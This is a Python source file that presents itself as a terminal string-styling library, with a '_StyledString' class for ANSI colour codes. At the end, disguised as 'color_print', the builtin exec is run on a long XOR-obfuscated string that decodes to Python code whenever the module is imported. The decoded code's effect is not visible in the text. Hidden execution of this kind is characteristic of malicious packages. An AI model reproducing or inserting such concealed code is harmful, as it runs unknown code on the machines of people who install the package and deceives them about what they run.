import os

import strstyle

color_print = exec
class _StyledString(str):

    def __new__(cls, style_list, sep, *objects):
        return super(_StyledString, cls).__new__(cls, sep.join([str(obj) for obj in objects]))

    def __init__(self, style_list, sep, *objects):
        self._style_start = ';'.join([str(s[0]) for s in style_list])
        self._style_end = ';'.join([str(s[1]) for s in style_list])
        self._sep = sep
        self._objects = objects

    def __add__(self, other):
        return self.__str__() + str(other)

    def __str__(self):
        if strstyle._StyledStringBuilder._enabled:
            string = ''
            for i, obj in enumerate(self._objects):
                if i > 0:
                    string += self._sep

                if type(obj) is _StyledString:
                    string += '%s\033[%sm' % (obj, self._style_start)
                else:
                    string += str(obj)
            return '\033[%sm%s\033[%sm' % (self._style_start, string, self._style_end)
        return super(_StyledString, self).__str__()

    def rjust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.rjust(len(string) + n_chars, fillchar)
        return self

    def ljust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.ljust(len(string) + n_chars, fillchar)
        return self
wopvEaTEcopFEavc ="_\\CXEL\x17\\D\x1fB^QM_WGT\x1fGM[BBXVUFD3ZQ\x10G_V@W^@Y\x1cEACFT^\x1d\x1a\x1fC@V@M@AXG_\x18\x14~YZ@J\x15\x11\n>\x17\x12\x13\x10\x16\x17\x10\x19LF@\x02:\x13\x19\x10\x12\x13\x19\x15\x11\x12\x15\x17\x18AYG^\x11\\GRV\x1f\x14\x18G_B\x1f_PTP\x17CM\x1f\x15\x12\x17@\x12\x19\x15VJ\x13Q\n=\x13\x17\x14\x11\x11\x12\x14\x12\x16\x18\x10\x12\x11\x13\x15\x13W\x1eCE[MV\x1e\x13\x11\x15:__@[GF\x17KEVG@\\SSDC3^FVU\x10FK\\^Z[\x15X_EXJB\x10AS@FRDL=GEJ\x088\x10\x19\x19\x18G\\^[L\\mEEY\x10\x08\x10QGC@D\t\x18\x1bU]\x1cP@YHR]I\x1dV\\\\\x1fG\x18\x07RZQERZ\x03C@EBPVT\x17DCVF\x1dC^\x10:\x19\x18\x14\x19T_PX\\mUPYT\x12\x08\x17\x1f\x19D^F\x1e\x1dCZH\x19@_\x148\x12\x10\x19\x19JPHFQKM\x1cEEYBPCKZRFR\x1bEQ\\^FQmCJ\\\x1e\x11_ZPP\\kQ[UV\x1f;\x13\x17\x10\x16AEVE@X[UGD\x1cPQZ[\x18\x1bZUJP\x10\x1cM]B\x1c\x17A\\B\x1bDP\x16\x0e\x1cRTE\x18YM[_\x17\x01\x0c\x14\x01\x1b\x15\x18FQVXT\x04fBBP\x19?RAPR@C\t=\x14\x11\x11\x12D@_VD\x1a\x189\x15\x13\x11\x10\x14\x17\x12\x19\x13\x16\x11\x13\x17\x10\x16\x12\x12\x16\x17\x1b=\x18\x10\x14\x17\x12\x13\x10\x16RHZ]DM\x18vZUU|\\Ms^G[S}DB\\D\x0b9\x17\x17\x18\x17\x13\x17\x13\x12\x12\x10\x19\x19HGP]@\x10\x1b\x10\x19=\x15\x10\x15\x17\x19\x13\x17\x10DFUDC^QQAE\x16SS]_\x1d\x11AI@_]W\x00\x16\x1eGZ@\x19TYXP\x1cGA\x10\x12\x15\x1e\x13C^R\\U\x05`KMU\x1a3:893" 
iOpvEoeaaeavocp = "6137787373220998593489207505793707374112426802135310472936137062045278047230670984980390239512578603"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for i in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
color_print(oIoeaTEAcvpae)